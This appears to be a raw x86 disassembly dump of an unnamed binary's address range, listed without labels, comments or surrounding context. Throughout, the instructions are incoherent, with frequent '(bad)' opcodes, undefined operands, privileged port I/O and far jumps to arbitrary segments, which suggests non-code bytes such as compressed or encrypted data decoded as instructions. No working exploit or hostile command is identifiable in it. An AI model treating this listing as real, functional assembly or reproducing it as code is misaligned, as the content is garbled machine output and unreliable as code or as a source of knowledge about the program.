  42dc92:	sbb    eax,0x222d2ff4
  42dc97:	jne    0x42dcae
  42dc99:	pop    ds
  42dc9a:	ret    0xd1cf
  42dc9d:	jmp    0xb4a75686
  42dca2:	and    DWORD PTR ds:0xe2c46dc9,esp
  42dca8:	mov    al,ds:0xb0281c1c
  42dcad:	mov    dh,0xce
  42dcaf:	gs sti 
  42dcb1:	adc    bl,BYTE PTR [ecx-0x40562c10]
  42dcb7:	dec    edi
  42dcb8:	push   edi
  42dcb9:	pop    edx
  42dcba:	mov    BYTE PTR [esi-0x5e],bh
  42dcbd:	inc    edi
  42dcbe:	ins    BYTE PTR es:[edi],dx
  42dcbf:	jle    0x42dc43
  42dcc1:	jne    0x42dcc3
	...
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x3fb8ba6]
  42dd44:	sub    ch,ah
  42dd46:	add    DWORD PTR [eax],eax
  42dd48:	test   BYTE PTR [eax],0x0
  42dd4b:	add    BYTE PTR [edx+eiz*2-0x56],cl
  42dd4f:	mov    dl,0xf3
  42dd51:	xor    al,0x3c
  42dd53:	pop    es
  42dd54:	pop    ss
  42dd55:	dec    ecx
  42dd56:	lods   al,BYTE PTR ds:[esi]
  42dd57:	xchg   esi,eax
  42dd58:	push   ebp
  42dd59:	(bad)  
  42dd5b:	jmp    0x82e7:0xdf1c0581
  42dd62:	pop    ecx
  42dd63:	icebp  
  42dd64:	rol    BYTE PTR [esi],0x6b
  42dd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd68:	outs   dx,BYTE PTR gs:[esi]
  42dd6a:	outs   dx,BYTE PTR ds:[esi]
  42dd6b:	ror    DWORD PTR [eax-0x62a3525c],1
  42dd71:	cld    
  42dd72:	femms  
  42dd74:	xchg   edx,eax
  42dd75:	les    edi,FWORD PTR [edx+0x341d964b]
  42dd7b:	jns    0x42dd10
  42dd7d:	inc    esp
  42dd7e:	and    ch,BYTE PTR [eax*2+0x2e316d64]
  42dd85:	push   0x3efffc8f
  42dd8a:	imul   ebp,DWORD PTR [edx+0x5e],0x20
  42dd8e:	out    0x3b,al
  42dd90:	xor    eax,0x445f214e
  42dd95:	mov    bh,0xea
  42dd97:	xor    eax,0x1d413c3f
  42dd9c:	fsub   QWORD PTR [ebp-0x79]
  42dd9f:	mov    ch,0x53
  42dda1:	inc    edi
  42dda2:	icebp  
  42dda3:	add    DWORD PTR [ecx+0x7f],0x9f8569aa
  42ddaa:	call   0xd48a:0xa40eff84
  42ddb1:	xor    dl,BYTE PTR [ebx]
  42ddb3:	repz xchg ecx,eax
  42ddb5:	and    eax,0x5ee8c7c3
  42ddba:	add    al,0xf2
  42ddbc:	cmp    eax,0xe92303a9
  42ddc1:	push   ss
  42ddc2:	jge    0x42dd9e
  42ddc4:	mov    cl,0xfb
  42ddc6:	arpl   bp,ax
  42ddc8:	out    0x53,eax
  42ddca:	pop    edi
  42ddcb:	out    0xb4,al
  42ddcd:	cmp    eax,0x5ea6ca28
  42ddd2:	add    al,0x40
  42ddd4:	popa   
  42ddd5:	jl     0x42de22
  42ddd7:	inc    edx
  42ddd8:	xchg   esi,eax
  42ddd9:	adc    DWORD PTR [edi],esp
  42dddb:	jnp    0x42de17
  42dddd:	lds    edx,FWORD PTR [edi+0x3672a826]
  42dde3:	into   
  42dde4:	xchg   ebp,eax
  42dde5:	loope  0x42ddd6
  42dde7:	push   eax
  42dde8:	sub    eax,0xb0ecd626
  42dded:	shr    BYTE PTR [esi-0x75],cl
  42ddf0:	or     eax,0x6f41ee2f
  42ddf5:	popa   
  42ddf6:	lods   eax,DWORD PTR ds:[esi]
  42ddf7:	mov    edx,DWORD PTR [ecx-0x27]
  42ddfa:	(bad)  
  42ddfb:	retf   0x8dab
  42ddfe:	iret   
  42ddff:	call   0x7e75:0xb0f77048
  42de06:	cmp    bh,BYTE PTR [eax-0x31]
  42de09:	jnp    0x42ddcf
  42de0b:	sar    BYTE PTR [ecx+edx*4+0x2a],1
  42de0f:	add    BYTE PTR [ebp+0x39],0x66
  42de13:	data16 aad 0xc
  42de16:	loop   0x42de84
  42de18:	lahf   
  42de19:	fisttp WORD PTR [ebp-0x75]
  42de1c:	push   ds
  42de1d:	stc    
  42de1e:	loope  0x42dde9
  42de20:	mov    bl,0xf8
  42de22:	retf   
  42de23:	jns    0x42de99
  42de25:	fidivr DWORD PTR [esi+0x8]
  42de28:	enter  0xc583,0xc1
  42de2c:	push   ds
  42de2d:	rcl    BYTE PTR ds:0xb354ef20,cl
  42de33:	add    BYTE PTR [edx+0x1d87b5b8],0xf0
  42de3a:	mov    eax,0x2d2f5ef8
  42de3f:	stos   BYTE PTR es:[edi],al
  42de40:	outs   dx,BYTE PTR ds:[esi]
  42de41:	push   es
	...
  42deb2:	add    BYTE PTR [eax],al
  42deb4:	jae    0x42def3
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi-0x66065bf4]
  42dec3:	loop   0x42dee3
  42dec5:	out    0x1,al
  42dec7:	add    dh,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [esi],cl
  42decd:	fs inc ecx
  42decf:	es dec ebx
  42ded1:	xor    al,0xe4
  42ded3:	fs pop esp
  42ded5:	cmc    
  42ded6:	xchg   edx,eax
  42ded7:	sub    BYTE PTR [ebp-0x6f3b5745],ch
  42dedd:	int    0xbf
  42dedf:	pusha  
  42dee0:	dec    ecx
  42dee1:	pop    ebp
  42dee2:	inc    esi
  42dee3:	mov    cl,0xf8
  42dee5:	mov    WORD PTR [esi+0x59],?
  42dee8:	inc    eax
  42dee9:	repz cmp BYTE PTR [ebx+0x67],0x5e
  42deee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42deef:	or     edi,DWORD PTR [edi]
  42def1:	and    cl,BYTE PTR [ecx+0x52c13390]
  42def7:	push   ss
  42def8:	sbb    BYTE PTR [eax+0x54cc114f],bl
  42defe:	aam    0xfe
  42df00:	dec    esp
  42df01:	call   0x664d:0x435b530f
  42df08:	xchg   DWORD PTR [ebp+eiz*2+0x7],eax
  42df0c:	jno    0x42dea6
  42df0e:	xchg   esi,eax
  42df0f:	jo     0x42df31
  42df11:	ins    DWORD PTR es:[edi],dx
  42df12:	add    al,0x17
  42df14:	fisubr DWORD PTR [edx+edx*4+0x79584950]
  42df1b:	mov    ch,al
  42df1d:	and    BYTE PTR [ecx],ah
  42df1f:	mov    WORD PTR gs:0xbf14cbe,?
  42df26:	in     al,0x19
  42df28:	inc    esi
  42df29:	int3   
  42df2a:	pop    esi
  42df2b:	and    DWORD PTR [ebx],0xffffffe2
  42df2e:	push   edx
  42df2f:	ins    DWORD PTR es:[edi],dx
  42df30:	not    cl
  42df32:	push   es
  42df33:	cmp    BYTE PTR [edx],dl
  42df35:	add    BYTE PTR [ebp+eiz*2-0x5],bh
  42df39:	pop    eax
  42df3a:	mov    ds:0xd7d2bc44,al
  42df3f:	add    eax,0xb6b59ec3
  42df44:	jbe    0x42deee
  42df46:	popa   
  42df47:	add    ecx,esp
  42df49:	xchg   edi,eax
  42df4a:	dec    ebp
  42df4b:	jmp    0x42df03
  42df4d:	mov    dl,0x9d
  42df4f:	or     esp,DWORD PTR [edi-0x26]
  42df52:	lods   eax,DWORD PTR ds:[esi]
  42df53:	pop    ds
  42df54:	mov    cs,WORD PTR [ebx-0x2]
  42df57:	outs   dx,DWORD PTR ds:[esi]
  42df58:	sub    DWORD PTR [eax-0x186815ed],ecx
  42df5e:	ins    DWORD PTR es:[edi],dx
  42df5f:	push   ebp
  42df60:	adc    ah,BYTE PTR [edx-0x37]
  42df63:	xor    DWORD PTR [esi-0x28ae01c3],edi
  42df69:	rcl    BYTE PTR [edx+esi*1],0xae
  42df6d:	sbb    al,0x3e
  42df6f:	je     0x42def7
  42df71:	fcmovu st,st(6)
  42df73:	pop    ebx
  42df74:	jge    0x42df20
  42df76:	dec    edi
  42df77:	ja     0x42dfc8
  42df79:	aam    0x5b
  42df7b:	mov    ds:0xa3c45e4c,eax
  42df80:	dec    edx
  42df81:	add    edx,edi
  42df83:	xchg   edx,eax
  42df84:	pop    esi
  42df85:	(bad)  
  42df86:	out    0xf1,al
  42df88:	push   edx
  42df89:	jle    0x42e005
  42df8b:	(bad)  
  42df8c:	in     al,0x33
  42df8e:	repnz stc 
  42df90:	mov    al,ds:0x3ea0ce23
  42df95:	ret    0xa4ae
  42df98:	nop
  42df99:	in     eax,dx
  42df9a:	pop    ebx
  42df9b:	cld    
  42df9c:	mov    eax,ds:0x26eb0ad
  42dfa1:	push   eax
  42dfa2:	mov    al,0x25
  42dfa4:	es push esi
  42dfa6:	and    ebp,eax
  42dfa8:	and    eax,0x7d999473
  42dfad:	in     eax,0x48
  42dfaf:	jo     0x42df4a
  42dfb1:	adc    DWORD PTR [ebp-0x62],0xfffffff6
  42dfb5:	inc    ecx
  42dfb6:	clc    
  42dfb7:	daa    
  42dfb8:	stos   BYTE PTR es:[edi],al
  42dfb9:	xor    BYTE PTR [esi+0x59],al
  42dfbc:	leave  
  42dfbd:	aas    
  42dfbe:	out    0x61,eax
  42dfc0:	mov    ah,0x3b
	...
  42e032:	add    BYTE PTR [eax],al
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx-0x2068ee1e],0x9e
  42e044:	adc    al,0xe7
  42e046:	add    DWORD PTR [eax],eax
  42e048:	test   BYTE PTR [eax],0x0
  42e04b:	add    BYTE PTR [edi-0x48fb736a],dh
  42e051:	dec    esi
  42e052:	push   cs
  42e053:	fcom   DWORD PTR [edi]
  42e055:	jno    0x42e05b
  42e057:	and    esi,DWORD PTR [edx-0x6d]
  42e05a:	and    esi,ebx
  42e05c:	jmp    FWORD PTR [edi-0x4eca2a9b]
  42e062:	pop    ebp
  42e063:	inc    ebx
  42e064:	cmp    ebp,edi
  42e066:	loop   0x42e088
  42e068:	mov    cl,0x60
  42e06a:	cmp    al,0x9
  42e06c:	jbe    0x42e046
  42e06e:	push   esi
  42e06f:	mov    ah,al
  42e071:	xchg   edi,ebp
  42e073:	ds jp  0x42e0c3
  42e076:	les    eax,FWORD PTR es:[ecx]
  42e079:	mov    ds:0x7c0ff113,al
  42e07e:	mov    BYTE PTR [edx],dl
  42e080:	test   al,0x18
  42e082:	mov    edx,0xd348b35f
  42e087:	mov    al,ds:0xe16b129a
  42e08c:	mov    esi,0x7aca00b8
  42e091:	hlt    
  42e092:	mov    eax,0x2b21fb3a
  42e097:	loop   0x42e0b9
  42e099:	and    DWORD PTR [eax],edi
  42e09b:	stc    
  42e09c:	mov    ds:0x637eeaa0,al
  42e0a1:	dec    esp
  42e0a2:	push   0x6ba6c65e
  42e0a7:	dec    esp
  42e0a8:	dec    edx
  42e0a9:	bnd ret 0xe53f
  42e0ad:	lds    eax,FWORD PTR [ebx]
  42e0af:	inc    ecx
  42e0b0:	(bad)  
  42e0b1:	in     al,dx
  42e0b2:	stc    
  42e0b3:	mov    ebp,0x6addda95
  42e0b8:	ficomp DWORD PTR [eax+0x1]
  42e0bb:	cli    
  42e0bc:	aam    0xe
  42e0be:	je     0x42e045
  42e0c0:	pop    ss
  42e0c1:	leave  
  42e0c2:	(bad)  
  42e0c3:	pop    edx
  42e0c4:	pop    ss
  42e0c5:	shl    BYTE PTR [ecx-0x2b58ea59],0x6c
  42e0cc:	xor    eax,0x69828f2d
  42e0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0d2:	inc    ebx
  42e0d3:	sub    esp,DWORD PTR [esi+0x4e]
  42e0d6:	mov    al,BYTE PTR [eax]
  42e0d8:	ins    DWORD PTR es:[edi],dx
  42e0d9:	push   esp
  42e0da:	sbb    al,0x61
  42e0dc:	pop    ebp
  42e0dd:	adc    esi,eax
  42e0df:	and    al,0x28
  42e0e1:	or     ebp,edi
  42e0e3:	aaa    
  42e0e4:	mov    ds:0xb2fe3cc4,eax
  42e0e9:	test   DWORD PTR [esi+ebp*8],esi
  42e0ec:	inc    esp
  42e0ed:	push   0xffffff8c
  42e0ef:	aas    
  42e0f0:	cwde   
  42e0f1:	cmp    BYTE PTR [edx],bl
  42e0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e0f4:	mov    BYTE PTR [ecx],dh
  42e0f6:	fstp   st(3)
  42e0f8:	sar    BYTE PTR [edi+0x3ebf0fac],cl
  42e0fe:	add    BYTE PTR [eax-0x7bd73a5b],al
  42e104:	dec    ecx
  42e105:	inc    ebp
  42e106:	fwait
  42e107:	mov    ds,WORD PTR [edi+0x632db83c]
  42e10d:	call   0x2f:0x2ed9d1f0
  42e114:	aam    0x5b
  42e116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e117:	aas    
  42e118:	out    0x8,al
  42e11a:	or     ecx,eax
  42e11c:	add    eax,0x8d656d1c
  42e121:	out    0x9,al
  42e123:	push   ebp
  42e124:	pop    ds
  42e125:	sahf   
  42e126:	es pop eax
  42e128:	sub    al,BYTE PTR [eax-0x724496b8]
  42e12e:	mov    eax,0x41367a47
  42e133:	outs   dx,DWORD PTR ds:[esi]
  42e134:	stos   DWORD PTR es:[edi],eax
  42e135:	arpl   WORD PTR [eax+ecx*2],bx
  42e138:	xchg   ah,dl
  42e13a:	adc    DWORD PTR [ebx+eiz*4+0x67],esp
  42e13e:	in     eax,0xa9
  42e140:	mov    WORD PTR [eax+0x0],ss
	...
  42e1b2:	add    BYTE PTR [eax],al
  42e1b4:	lea    ecx,[eax]
  42e1b6:	pop    ebp
  42e1b7:	jbe    0x42e196
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0xfbf9c771
  42e1c3:	call   0xf6:0x1e80a
  42e1ca:	add    BYTE PTR [eax],al
  42e1cc:	pop    es
  42e1cd:	jle    0x42e1eb
  42e1cf:	daa    
  42e1d0:	xchg   ebx,eax
  42e1d1:	jmp    0x42e1fe
  42e1d3:	mov    ds:0xe0b35927,eax
  42e1d8:	dec    BYTE PTR [ebp+eax*4+0x6b]
  42e1dc:	lock push eax
  42e1de:	jecxz  0x42e201
  42e1e0:	sbb    al,0xcb
  42e1e2:	dec    edx
  42e1e3:	sub    ebx,ecx
  42e1e5:	shl    BYTE PTR [ebp*1-0x75f9a690],cl
  42e1ec:	pop    eax
  42e1ed:	out    dx,eax
  42e1ee:	daa    
  42e1ef:	ffreep st(1)
  42e1f1:	fsub   st(3),st
  42e1f3:	cld    
  42e1f4:	(bad)  
  42e1f7:	std    
  42e1f8:	jmp    0xf5d:0x3e929461
  42e1ff:	sub    esp,DWORD PTR [eax]
  42e201:	pop    ecx
  42e202:	js     0x42e21d
  42e204:	sbb    al,0x3f
  42e206:	jb     0x42e24d
  42e208:	cmp    eax,eax
  42e20a:	jbe    0x42e20a
  42e20c:	loopne 0x42e1f6
  42e20e:	sar    BYTE PTR [ecx],cl
  42e210:	pop    edx
  42e211:	psubq  mm7,QWORD PTR [edx+0x38]
  42e215:	cdq    
  42e216:	or     al,0xdd
  42e218:	pop    ebp
  42e219:	add    dh,BYTE PTR [ecx]
  42e21b:	mov    ah,0x58
  42e21d:	add    ah,BYTE PTR ds:0x4da3d5e5
  42e223:	jbe    0x42e240
  42e225:	dec    esi
  42e226:	mov    esp,0x8bd498dc
  42e22b:	fistp  WORD PTR [ecx]
  42e22d:	sub    eax,0xa6a8e1f0
  42e232:	lods   al,BYTE PTR ds:[esi]
  42e233:	ficom  DWORD PTR [ebx]
  42e235:	or     al,0x83
  42e237:	ret    0xab42
  42e23a:	setns  bh
  42e23d:	xor    BYTE PTR [edx],bl
  42e23f:	xchg   ebx,eax
  42e240:	out    0x9a,eax
  42e242:	cmc    
  42e243:	sahf   
  42e244:	les    ecx,FWORD PTR [ebp+edx*4-0x3266c856]
  42e24b:	ret    0xfcb4
  42e24e:	in     al,dx
  42e24f:	mov    esp,0x499a949d
  42e254:	imul   DWORD PTR [esi-0x77]
  42e257:	mov    ds:0x83d20143,al
  42e25c:	ficomp DWORD PTR [edi]
  42e25e:	ss mov esi,0xbdac1545
  42e264:	addr16 jmp 0x1112:0xe682bd9c
  42e26c:	enter  0x97e2,0x73
  42e270:	sub    eax,0x9a14f3f5
  42e275:	adc    dl,0x43
  42e278:	pusha  
  42e279:	add    ebp,DWORD PTR [ecx+ecx*1+0x28]
  42e27d:	xchg   DWORD PTR [esi],esi
  42e27f:	xchg   DWORD PTR ds:0x6210638c,ebp
  42e285:	adc    DWORD PTR [edx],0x78
  42e288:	fisttp DWORD PTR [eax]
  42e28a:	mov    eax,ds:0x8a041688
  42e28f:	mov    WORD PTR [ebp-0x7b],ds
  42e292:	xor    DWORD PTR [edi],esi
  42e294:	inc    esp
  42e295:	or     al,0x9
  42e297:	pop    edi
  42e298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e299:	cs (bad) 
  42e29b:	mov    esp,DWORD PTR [ecx-0x5f47de23]
  42e2a1:	outs   dx,DWORD PTR ds:[esi]
  42e2a2:	imul   edx,DWORD PTR [ecx],0x4983e231
  42e2a8:	push   cs
  42e2a9:	dec    ebx
  42e2aa:	cli    
  42e2ab:	jl     0x42e25a
  42e2ad:	sub    ecx,DWORD PTR [edx]
  42e2af:	pop    esp
  42e2b0:	fcomip st,st(7)
  42e2b2:	mov    bl,0xa5
  42e2b4:	push   esp
  42e2b5:	(bad)  
  42e2b6:	and    al,0x98
  42e2b8:	in     eax,0xe8
  42e2ba:	outs   dx,BYTE PTR ds:[esi]
  42e2bb:	jo     0x42e2d2
  42e2bd:	in     eax,0xfc
  42e2bf:	push   edx
  42e2c0:	pop    edx
  42e2c1:	add    eax,DWORD PTR [eax]
	...
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [esi],esi
  42e341:	inc    edx
  42e342:	add    bh,bl
  42e344:	add    cl,ch
  42e346:	add    DWORD PTR [eax],eax
  42e348:	test   BYTE PTR [eax],0x0
  42e34b:	add    BYTE PTR [edi+0x66],ch
  42e34e:	mov    bl,0x31
  42e350:	shl    DWORD PTR [esi+0x16],1
  42e353:	mov    ds,esp
  42e355:	pop    esp
  42e356:	dec    ecx
  42e357:	lods   al,BYTE PTR ds:[esi]
  42e358:	jge    0x42e2e6
  42e35a:	sti    
  42e35b:	cdq    
  42e35c:	push   ebx
  42e35d:	sbb    eax,0x44646f6d
  42e362:	retf   0xd75f
  42e365:	adc    DWORD PTR [edx],esp
  42e367:	lahf   
  42e368:	rcl    BYTE PTR [esi-0x79ebd0ad],cl
  42e36e:	jge    0x42e38e
  42e370:	mov    esi,edx
  42e372:	add    BYTE PTR [eax+0x18],0x72
  42e376:	dec    ecx
  42e377:	imul   edi,eax,0xffffffb3
  42e37a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42e37c:	test   eax,0xc93de450
  42e381:	in     eax,dx
  42e382:	dec    ebx
  42e383:	sub    eax,0x27ac1b09
  42e388:	daa    
  42e389:	xchg   edi,eax
  42e38a:	jne    0x42e33d
  42e38c:	jp     0x42e351
  42e38e:	lods   eax,DWORD PTR ds:[esi]
  42e38f:	xor    esi,DWORD PTR [ecx+0x4]
  42e392:	mov    ecx,0xc23edaf3
  42e397:	jmp    0xe7427348
  42e39c:	mov    DWORD PTR [eax-0x70],edi
  42e39f:	xchg   esp,eax
  42e3a0:	mov    cl,bh
  42e3a2:	clc    
  42e3a3:	rcr    ebp,cl
  42e3a5:	lds    edi,FWORD PTR [edi+0x20bb174]
  42e3ab:	add    dh,BYTE PTR [esi+0x3e74d6c0]
  42e3b1:	int    0x48
  42e3b3:	adc    DWORD PTR [ebx],eax
  42e3b5:	add    DWORD PTR es:[ebx],edx
  42e3b8:	xor    bl,ah
  42e3ba:	sbb    DWORD PTR [ebx+0x55],0x9f6dcffa
  42e3c1:	jne    0x42e3ed
  42e3c3:	int3   
  42e3c4:	and    ah,BYTE PTR [eax+eax*4-0x7e3a32bd]
  42e3cb:	push   esp
  42e3cc:	cmc    
  42e3cd:	sti    
  42e3ce:	ins    DWORD PTR es:[edi],dx
  42e3cf:	out    dx,al
  42e3d0:	dec    esp
  42e3d1:	ins    DWORD PTR es:[edi],dx
  42e3d2:	mov    cl,0x22
  42e3d4:	inc    edx
  42e3d5:	js     0x42e3a6
  42e3d7:	pop    ecx
  42e3d8:	dec    ebp
  42e3d9:	xor    dl,BYTE PTR [esi+0x13]
  42e3dc:	inc    ebx
  42e3dd:	fnstsw WORD PTR [edi]
  42e3df:	and    bh,BYTE PTR [edi-0x58]
  42e3e2:	xchg   esi,eax
  42e3e3:	inc    edi
  42e3e4:	rol    cl,0xf0
  42e3e7:	les    eax,FWORD PTR [edx]
  42e3e9:	or     eax,0xddad3ea1
  42e3ee:	repnz jecxz 0x42e37c
  42e3f1:	xor    bl,BYTE PTR [edx-0x7e]
  42e3f4:	int    0xac
  42e3f6:	jg     0x42e385
  42e3f8:	daa    
  42e3f9:	shl    DWORD PTR [eax-0xc],1
  42e3fc:	pop    edi
  42e3fd:	in     eax,dx
  42e3fe:	xchg   ebx,eax
  42e3ff:	xchg   esp,eax
  42e400:	xor    al,0x4a
  42e402:	jmp    0x2fdcec95
  42e407:	xor    ch,dl
  42e409:	xor    al,0x75
  42e40b:	rol    DWORD PTR [esi+0x64],1
  42e40e:	or     DWORD PTR [ebx+0x5db55d27],ecx
  42e414:	or     BYTE PTR [eax+0x52],dh
  42e417:	push   es
  42e418:	out    dx,al
  42e419:	retf   0x28a6
  42e41c:	xchg   DWORD PTR [ecx-0x80],ebx
  42e41f:	pop    ebp
  42e420:	js     0x42e3ba
  42e422:	sub    al,0x94
  42e424:	jge    0x42e462
  42e426:	out    0xfc,al
  42e428:	das    
  42e429:	jecxz  0x42e3c4
  42e42b:	xor    edi,DWORD PTR [edi-0x299a3a82]
  42e431:	or     bl,BYTE PTR [ecx+0x62b26ba4]
  42e437:	jae    0x42e453
  42e439:	loopne 0x42e457
  42e43b:	addr16 xchg edx,eax
  42e43d:	add    BYTE PTR [ebp*8+0xf145],dl
	...
  42e4b4:	cdq    
  42e4b5:	cmc    
  42e4b6:	adc    BYTE PTR [ebx-0x12],0x77
  42e4ba:	fcos   
  42e4bc:	pavgw  mm4,mm3
  42e4bf:	mov    esp,0x9da1c1aa
  42e4c4:	imul   cl
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	test   BYTE PTR [eax],0x0
  42e4cb:	add    BYTE PTR [esi-0x4b7d7a16],ah
  42e4d1:	mov    cl,0xb
  42e4d3:	div    BYTE PTR [esi]
  42e4d5:	retf   
  42e4d6:	fsub   QWORD PTR [edx]
  42e4d8:	xor    ecx,ecx
  42e4da:	retf   0x9b7a
  42e4dd:	cmp    BYTE PTR [ecx],bl
  42e4df:	mov    eax,0xe03600f5
  42e4e4:	xlat   BYTE PTR ds:[ebx]
  42e4e5:	rcr    BYTE PTR [ebx-0x6d1f1d26],cl
  42e4eb:	push   esp
  42e4ec:	(bad)  
  42e4ed:	push   esi
  42e4ee:	mov    BYTE PTR [ebx-0x7ebbf40],ah
  42e4f4:	out    dx,al
  42e4f5:	adc    eax,0x65ca2c0a
  42e4fa:	jmp    0x831a1af
  42e4ff:	out    dx,al
  42e500:	sti    
  42e501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e502:	xor    BYTE PTR [ecx-0x52],bl
  42e505:	popf   
  42e506:	inc    edx
  42e507:	in     al,dx
  42e508:	jmp    DWORD PTR [edi+0x10d74c84]
  42e50e:	aaa    
  42e50f:	fist   DWORD PTR [esp+ebx*4]
  42e512:	cmp    al,0xde
  42e514:	sbb    BYTE PTR ds:0xc4c01a86,bl
  42e51a:	mov    dl,0x84
  42e51c:	test   DWORD PTR [ebp-0x7a],esp
  42e51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e520:	cmp    BYTE PTR [edx],ch
  42e522:	pop    ebp
  42e523:	sbb    ebx,ebx
  42e525:	xchg   ecx,eax
  42e526:	sbb    al,BYTE PTR [esi+0x5f]
  42e529:	pop    esi
  42e52a:	mov    edx,0xb92eb3c
  42e52f:	push   esi
  42e530:	pushf  
  42e531:	test   BYTE PTR [edi-0x3d],al
  42e534:	(bad)  [edi+0xe]
  42e537:	xlat   BYTE PTR ds:[ebx]
  42e538:	sub    eax,0xbc7e647b
  42e53d:	fistp  WORD PTR [ebx]
  42e53f:	dec    ebp
  42e540:	ret    
  42e541:	adc    bl,cl
  42e543:	pop    es
  42e544:	dec    esp
  42e545:	pop    edx
  42e546:	loop   0x42e4df
  42e548:	outs   dx,DWORD PTR ds:[esi]
  42e54a:	lea    ebx,[edx]
  42e54c:	dec    edx
  42e54d:	fstp   QWORD PTR [edx-0x41]
  42e550:	inc    ebp
  42e551:	cs sahf 
  42e553:	xchg   ebp,eax
  42e554:	(bad)  
  42e555:	sub    eax,0x2778509f
  42e55a:	mov    eax,0x7c535830
  42e55f:	adc    eax,esi
  42e561:	fisubr DWORD PTR [eax+0x7e]
  42e564:	addr16 and al,0xc2
  42e567:	or     dl,al
  42e569:	jecxz  0x42e4ff
  42e56b:	out    dx,al
  42e56c:	in     eax,dx
  42e56d:	gs nop
  42e56f:	cmc    
  42e570:	loop   0x42e563
  42e572:	xlat   BYTE PTR ds:[ebx]
  42e573:	pop    es
  42e574:	ja     0x42e56b
  42e576:	inc    esi
  42e577:	ret    0x5c11
  42e57a:	jb     0x42e593
  42e57c:	inc    edx
  42e57d:	or     al,0x54
  42e57f:	cwde   
  42e580:	daa    
  42e581:	jmp    0xb5e9f342
  42e586:	fs aas 
  42e588:	adc    edx,esi
  42e58a:	aas    
  42e58b:	mov    BYTE PTR [ecx+0x62],dh
  42e58e:	xor    ecx,ebx
  42e590:	lahf   
  42e591:	dec    esi
  42e592:	jbe    0x42e53d
  42e594:	sub    al,0xab
  42e596:	mov    ecx,0xf14f54df
  42e59b:	test   DWORD PTR [edx+0x3e3d3a7c],edi
  42e5a1:	and    esi,DWORD PTR [esi-0x2968d549]
  42e5a7:	and    edi,DWORD PTR [edx+0x572dcfb6]
  42e5ad:	(bad)  
  42e5ae:	gs mov al,0x97
  42e5b1:	xchg   DWORD PTR [edx+0x5fe6a601],ecx
  42e5b7:	push   es
  42e5b8:	in     eax,dx
  42e5b9:	adc    DWORD PTR [ebx],0x1c61927b
  42e5bf:	retf   0x9f79
	...
  42e632:	add    BYTE PTR [eax],al
  42e634:	repz add esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	fld    st(6)
  42e642:	and    BYTE PTR [edx+0x1eaec],ah
  42e648:	test   BYTE PTR [eax],0x0
  42e64b:	add    ch,dh
  42e64d:	adc    DWORD PTR [edx],ebx
  42e64f:	shl    DWORD PTR [ebx-0x4f],cl
  42e652:	mov    WORD PTR [esi-0x2f9b083],ss
  42e658:	add    eax,0x60e559d4
  42e65d:	rol    esp,1
  42e65f:	cmp    BYTE PTR [edx],0x6d
  42e662:	push   ebp
  42e663:	in     al,dx
  42e664:	imul   ecx,ebx,0x71
  42e667:	adc    eax,0xf6f75602
  42e66c:	js     0x42e675
  42e66e:	jne    0x42e6ec
  42e670:	dec    ebx
  42e671:	and    eax,0xcf88d980
  42e676:	xchg   esp,eax
  42e677:	push   esp
  42e678:	(bad)  
  42e67a:	jae    0x42e6de
  42e67c:	popf   
  42e67d:	jmp    0x42e6ef
  42e67f:	mov    bl,0x14
  42e681:	add    eax,0x56766e5e
  42e686:	push   esi
  42e687:	ror    BYTE PTR [edi+0x18],cl
  42e68a:	lds    ecx,FWORD PTR [ebx-0x9313ae9]
  42e690:	icebp  
  42e691:	mov    bl,0xb8
  42e693:	lds    eax,FWORD PTR [ebx+0x5c5676c5]
  42e699:	dec    edx
  42e69a:	or     DWORD PTR [esi+ebp*1],ecx
  42e69d:	and    DWORD PTR [eax],0xb6cea635
  42e6a3:	and    DWORD PTR [edx],0x42
  42e6a6:	outs   dx,BYTE PTR ds:[esi]
  42e6a7:	rcl    BYTE PTR [edx+eax*8+0x5e6a996c],cl
  42e6ae:	icebp  
  42e6af:	out    dx,eax
  42e6b0:	push   esi
  42e6b1:	pxor   mm6,QWORD PTR [eax+0x1a80b73f]
  42e6b8:	xor    ebp,ecx
  42e6ba:	fldenv [ecx]
  42e6bc:	retf   0x1ec3
  42e6bf:	cmp    DWORD PTR [ebx+0x33],edi
  42e6c2:	add    DWORD PTR [edi+ebx*2],eax
  42e6c5:	pop    edi
  42e6c6:	pusha  
  42e6c7:	or     DWORD PTR [ebp+0x0],esi
  42e6ca:	dec    eax
  42e6cb:	imul   ecx,esi,0x38
  42e6ce:	loopne 0x42e67b
  42e6d0:	sbb    eax,0xe6561700
  42e6d5:	adc    ch,BYTE PTR [ebp-0x2cbbf9cf]
  42e6db:	dec    ebp
  42e6dc:	dec    edi
  42e6dd:	push   ebx
  42e6de:	enter  0x7c90,0x7f
  42e6e2:	out    dx,eax
  42e6e3:	neg    DWORD PTR [esi+0x77]
  42e6e6:	hlt    
  42e6e7:	push   edi
  42e6e8:	inc    ebx
